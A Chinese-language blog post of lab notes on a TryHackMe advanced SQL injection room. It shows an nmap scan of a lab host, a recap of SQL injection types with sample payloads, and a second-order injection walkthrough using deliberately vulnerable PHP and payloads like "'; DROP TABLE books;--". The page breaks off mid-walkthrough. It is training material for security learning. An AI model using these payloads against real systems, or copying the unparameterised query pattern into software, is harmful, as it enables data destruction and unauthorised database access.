<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AdvancedSQLInjectionTHM | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="IntroductionSQL 注入仍然是 Web 应用程序最严重和最普遍的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力时，就会出现这种威胁，从而导致未经授权访问数据库、数据泄露、数据操纵甚至完全控制应用程序。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击媒介和缓解策略。 在本房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种">
<meta property="og:type" content="article">
<meta property="og:title" content="AdvancedSQLInjectionTHM">
<meta property="og:url" content="https://blog.mikannse.cn/2024/06/15/AdvancedSQLInjectionTHM/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="IntroductionSQL 注入仍然是 Web 应用程序最严重和最普遍的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力时，就会出现这种威胁，从而导致未经授权访问数据库、数据泄露、数据操纵甚至完全控制应用程序。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击媒介和缓解策略。 在本房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-06-15T03:13:21.000Z">
<meta property="article:modified_time" content="2024-06-18T01:10:29.885Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="溯源取证">
<meta property="article:tag" content="笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://blog.mikannse.cn/2024/06/15/AdvancedSQLInjectionTHM/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'AdvancedSQLInjectionTHM',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-06-18 09:10:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">347</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">77</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">AdvancedSQLInjectionTHM</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-15T03:13:21.000Z" title="发表于 2024-06-15 11:13:21">2024-06-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-18T01:10:29.885Z" title="更新于 2024-06-18 09:10:29">2024-06-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="AdvancedSQLInjectionTHM"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>SQL 注入仍然是 Web 应用程序最严重和最普遍的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力时，就会出现这种威胁，从而导致未经授权访问数据库、数据泄露、数据操纵甚至完全控制应用程序。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击媒介和缓解策略。</p>
<p>在本房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和利用这些漏洞的技能，并实施强大的防御措施来保护您的应用程序。</p>
<p>学习目标</p>
<p>﻿通过本课程，您将全面了解以下关键概念：</p>
<ul>
<li>二阶 SQL 注入</li>
<li>过滤规避</li>
<li>带外 SQL 注入</li>
<li>自动化技术</li>
<li>缓解措施</li>
</ul>
<p>学习前提条件</p>
<p>建议在开始本课程之前了解以下主题：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/sqlinjectionlm">SQL 注入</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/sqlmap">SQLMAP</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/owasptop10">OWASP Top 10</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/furthernmap">Nmap</a></li>
</ul>
<p>在深入研究之前，清楚了解目标机器的数据库版本和操作系统详细信息至关重要。为此，我们可以利用强大的网络扫描工具 <strong>Nmap</strong> 彻底扫描 <code>10.10.20.127</code>。此扫描将提供有关开放端口、正在运行的服务和目标机器操作系统的宝贵见解。对于那些不熟悉 Nmap 的人，我们建议查看我们全面的 Nmap 房间，以快速有效地使用此工具。以下是扫描机器后的 Nmap 输出：</p>
<p>​            Terminal        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   thm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 10.10.20.127</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST</span><br><span class="line">Nmap scan report for 10.10.20.127</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE       VERSION</span><br><span class="line">135/tcp  open     msrpc</span><br><span class="line">139/tcp  open     netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds</span><br><span class="line">3306/tcp open     mysql</span><br><span class="line">3389/tcp open     ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=SQLi</span><br><span class="line">| Not valid before: 2024-05-23T04:08:44</span><br><span class="line">|_Not valid after:  2024-11-22T04:08:44</span><br><span class="line">|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.</span><br><span class="line">MAC Address: 02:87:BD:21:12:33 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running (JUST GUESSING): AVtech embedded (87%)</span><br><span class="line">Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>该机器正在 Windows 上使用 MySQL 服务。</p>
<p>让我们开始吧！</p>
<h1 id="Quick-Recap"><a href="#Quick-Recap" class="headerlink" title="Quick Recap"></a>Quick Recap</h1><p>在上一个 SQL 注入室中，我们探讨了 SQL 注入的基础知识，了解了攻击者如何利用 Web 应用程序中的漏洞来操纵 SQL 查询并访问未经授权的数据。我们介绍了基本技术，例如基于错误和基于联合的 SQL 注入，以及盲 SQL 注入方法，例如基于布尔和基于时间的攻击。以下是本室的简要回顾，涵盖了 SQL 注入的核心基本类型。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989638556" alt="types of SQL injection"></p>
<p>带内 SQL 注入</p>
<p>此技术被认为是最常见和最直接的 SQL 注入攻击类型。在这种技术中，攻击者使用相同的通信渠道进行数据注入和检索。带内 SQL 注入有两种主要类型：</p>
<ul>
<li><strong>基于错误的 SQL 注入</strong>：攻击者操纵 SQL 查询以从数据库生成错误消息。这些错误消息通常包含有关数据库结构的信息，可用于进一步利用数据库。示例：<code>SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))</code>。如果错误消息中返回数据库版本，则会显示有关数据库的信息。</li>
<li><strong>基于联合的 SQL 注入</strong>：攻击者使用 UNION SQL 运算符将两个或多个 SELECT 语句的结果合并为一个结果，从而从其他表中检索数据。示例：<code>SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin</code>。</li>
</ul>
<p>推理（盲）SQL 注入</p>
<p>推理 SQL 注入不会直接通过 Web 应用程序传输数据，因此利用它更具挑战性。相反，攻击者会发送有效载荷并观察应用程序的行为和响应时间，以推断有关数据库的信息。推理 SQL 注入主要有两种类型：</p>
<ul>
<li><strong>基于布尔的盲 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，迫使应用程序根据真或假条件返回不同的结果。通过分析应用程序的响应，攻击者可以推断有效载荷是真还是假。示例：<code>SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)</code>。如果页面内容或行为根据条件发生变化，攻击者可以推断结果。</li>
<li><strong>基于时间的盲 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，如果条件为真，则将响应延迟指定的时间。通过测量响应时间，攻击者可以推断条件是真还是假。例如，<code>SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--</code>。如果响应延迟 5 秒，攻击者可以推断条件为真。<br>带外 SQL 注入</li>
</ul>
<p>当攻击者无法使用相同的通道发起攻击并收集结果或服务器响应不稳定时，使用带外 SQL 注入。此技术依赖于数据库服务器发出带外请求（例如 HTTP 或 DNS）以将查询结果发送给攻击者。带外 SQL 注入通常使用 HTTP 将查询结果发送到攻击者的服务器。我们将在本房间详细讨论它。</p>
<p>每种类型的 SQL 注入技术都有其优点和挑战。了解这些技术对于识别和缓解 Web 应用程序中的 SQL 注入漏洞至关重要。带内 SQL 注入易于利用和检测，但噪声较大，容易被监控。推理（盲）SQL 注入更难利用，需要多个请求，但可以在没有详细错误消息时使用。带外 SQL 注入不太常见，但非常有效，需要外部服务器控制，并依赖于数据库发出带外请求的能力。通过掌握这些技术，渗透测试人员可以有效地识别和利用 SQL 注入漏洞，帮助组织保护其 Web 应用程序免受这些严重威胁。</p>
<h1 id="Second-Order-SQL-Injection"><a href="#Second-Order-SQL-Injection" class="headerlink" title="Second-Order SQL Injection"></a>Second-Order SQL Injection</h1><p>二阶 SQL 注入，也称为存储型 SQL 注入，利用用户提供的输入被保存并随后在应用程序的不同部分使用（可能经过一些初始处理）的漏洞。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，因此更难通过标准输入验证技术检测到。注入发生在第二次使用数据时，即在 SQL 命令中检索和使用数据时，因此得名“二阶”。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989709301" alt="second order sql injection workflow diagram"></p>
<p>Impact</p>
<p>二阶 SQL 注入的危险在于它能够绕过典型的前端防御，如基本输入验证或清理，这些防御仅在初始数据输入时发生。由于有效载荷在第一步不会造成中断，因此可能会被忽略，直到为时已晚，从而使攻击特别隐蔽。</p>
<p><strong>示例</strong><br>我们将使用一个图书评论应用程序。该应用程序允许用户通过网页 (<code>add.php</code>) 添加新书。系统会提示用户提供他们希望添加到数据库的图书的详细信息。您可以通过 <code>http://10.10.20.127/second/add.php</code><a target="_blank" rel="noopener" href="http://10.10.20.127/case1.">.</a> 访问该应用程序。收集的数据包括 <code>SSN</code>、<code>book_name</code> 和 <code>author</code>。让我们考虑添加一本具有以下详细信息的图书：<strong>SSN：UI00012</strong>、<strong>图书名称：PHP 简介</strong>、<strong>作者：Tim</strong>。该信息通过<code>add.php</code>页面上的表单输入，提交后存储在<strong>BookStore</strong>数据库中，如下所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715774633948" alt="adding a new book in database"></p>
<p>我们知道，二阶 SQL 注入非常难以识别。与利用实时处理漏洞的传统 SQL 注入不同，二阶 SQL 注入发生在先前存储在数据库中的数据随后用于 SQL 查询时。检测此漏洞通常需要了解数据如何流经应用程序并被重用，因此需要深入了解后端操作。</p>
<p><strong>代码分析</strong></p>
<p>考虑我们应用程序中用于添加书籍的 PHP 代码片段：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>])) {</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'ssn'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$book_name</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'book_name'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$author</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'author'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"INSERT INTO books (ssn, book_name, author) VALUES ('<span class="subst">$ssn</span>', '<span class="subst">$book_name</span>', '<span class="subst">$author</span>')"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p class='text-green-500'&gt;New book added successfully&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p class='text-red-500'&gt;Error: "</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}    </span><br></pre></td></tr></tbody></table></figure>

<p>代码使用 <code>real_escape_string()</code> 方法转义输入中的特殊字符。虽然此方法可以通过转义单引号和其他 SQL 元字符来减轻即时 SQL 注入的一些风险，但它不能保护应用程序免受二阶 SQLi 攻击。这里的关键问题是缺乏参数化查询，这对于防止 SQL 注入攻击至关重要。当使用 <code>real_escape_string()</code> 方法插入数据时，它可能包含不会造成直接损害但可以在后续检索和在另一个 SQL 查询中使用时激活的有效负载字符。例如，插入一本名为 <code>Intro to PHP'; DROP TABLE books;--</code> 的书可能不会影响 <strong>INSERT</strong> 操作，但如果书名稍后在另一个 SQL 上下文中使用而没有得到适当的处理，则可能会产生严重影响。</p>
<p>让我们尝试添加另一本带有 SSN <code>test</code> 的书。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715776065076" alt="total books in the database"></p>
<p>现在，SSN“test”已成功插入数据库。该应用程序包含一个通过“update.php”等界面更新图书详细信息的功能。此界面可能会在可编辑表单字段中显示现有图书详细信息，这些详细信息基于先前存储的数据进行检索，然后根据用户输入进行更新。渗透测试人员将调查应用程序是否重用了先前存储且可能被污染的数据（例如“book_name”）。然后，他将构建 SQL 查询以使用这些可能被污染的数据来更新记录，而无需进行适当的清理或参数化。通过操纵更新功能，测试人员可以查看在插入阶段添加的恶意负载是否在更新操作期间执行。如果应用程序在此阶段未能采用适当的安全措施，则可能会激活先前注入的负载“’; DROP TABLE books; –”，从而导致执行有害的 SQL 命令（例如删除表）。您可以访问页面“<a target="_blank" rel="noopener" href="http://10.10.20.127/second/update.php%E2%80%9D%E6%9D%A5%E6%9B%B4%E6%96%B0%E4%BB%BB%E4%BD%95%E5%9B%BE%E4%B9%A6%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E3%80%82">http://10.10.20.127/second/update.php”来更新任何图书详细信息。</a></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715786150389" alt="update book content dashboard"></p>
<p>现在，让我们回顾一下 <code>update.php</code> 代码。该 PHP 脚本允许用户在 <strong>BookStore</strong> 数据库中更新图书详细信息。通过查询结构，我们将分析渗透测试人员可能寻找 SQL 注入漏洞的典型场景，特别关注如何在 SQL 查询中处理和利用用户输入。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'update'</span>])) {</span><br><span class="line">    <span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">'update'</span>];</span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">'ssn_'</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">'new_book_name_'</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">'new_author_'</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$update_sql</span> = <span class="string">"UPDATE books SET book_name = '<span class="subst">$new_book_name</span>', author = '<span class="subst">$new_author</span>' WHERE ssn = '<span class="subst">$ssn</span>'; INSERT INTO logs (page) VALUES ('update.php');"</span>;</span><br><span class="line">..</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>

<p>该脚本首先检查请求方法是否为 POST，以及是否按下了更新按钮，这表明用户打算更新图书的详细信息。 随后，脚本直接从 POST 数据中检索用户输入：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">'update'</span>];</span><br><span class="line"><span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">'ssn_'</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">'new_book_name_'</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">'new_author_'</span> . <span class="variable">$unique_id</span>];  </span><br></pre></td></tr></tbody></table></figure>

<p>然后使用这些变量（ssn、new_book_name、new_author）构建 SQL 查询，以更新数据库中指定书籍的详细信息：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$update_sql</span> = <span class="string">"UPDATE books SET book_name = '<span class="subst">$new_book_name</span>', author = '<span class="subst">$new_author</span>' WHERE ssn = '<span class="subst">$ssn</span>'; INSERT INTO logs (page) VALUES ('update.php');"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>该脚本使用“multi_query”执行多个查询。它还将日志插入日志表中以供分析。</p>
<p>准备有效负载</p>
<p>我们知道我们可以根据书籍的“ssn”添加或修改书籍详细信息。更新书籍的正常查询可能如下所示：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">'$new_book_name'</span>, author = <span class="string">'$new_author'</span> WHERE ssn = <span class="string">'123123'</span>; </span><br></pre></td></tr></tbody></table></figure>

<p>但是，如果攻击者插入特制的“ssn”值，则 SQL 命令可能会被操纵。例如，如果攻击者使用“ssn”值：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">12345</span><span class="string">'; UPDATE books SET book_name = '</span>Hacked<span class="string">'; --</span></span><br></pre></td></tr></tbody></table></figure>

<p>当在更新查询中使用此值时，它会在 <code>12345</code> 之后有效地结束初始更新命令并启动新命令。这会将 books 表中所有条目的 <code>book_name</code> 更改为 <strong>Hacked</strong>。</p>
<p><strong>让我们这样做</strong></p>
<ul>
<li><strong>初始有效负载插入</strong>：添加一本新书，有效负载为 <code>12345'；UPDATE books SET book_name = 'Hacked'; --</code> 插入为 <code>ssn</code>。分号 (<code>;</code>) 将用于终止当前 SQL 语句。</li>
</ul>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789331772" alt="total books in database with injection payload"></p>
<ul>
<li><strong>恶意 SQL 执行</strong>：之后，当管理员或任何其他用户访问 URL <code>http://10.10.20.127/second/update.php</code> 并更新书籍时，插入的有效负载会突破预期的 SQL 命令结构并注入一条新命令，该命令会更新 books 表中的所有记录。让我们访问页面 <code>http://10.10.20.127/second/update.php page</code>，将书籍名称更新为任何内容，然后单击 <strong>更新</strong> 按钮。代码将在后端执行以下语句。</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">'Testing'</span>, author = <span class="string">'Hacker'</span> WHERE ssn = <span class="string">'12345'</span>; Update books set book_name =<span class="string">"hacked"</span>; --<span class="string">'; INSERT INTO logs (page) VALUES ('</span>update.php<span class="string">');</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
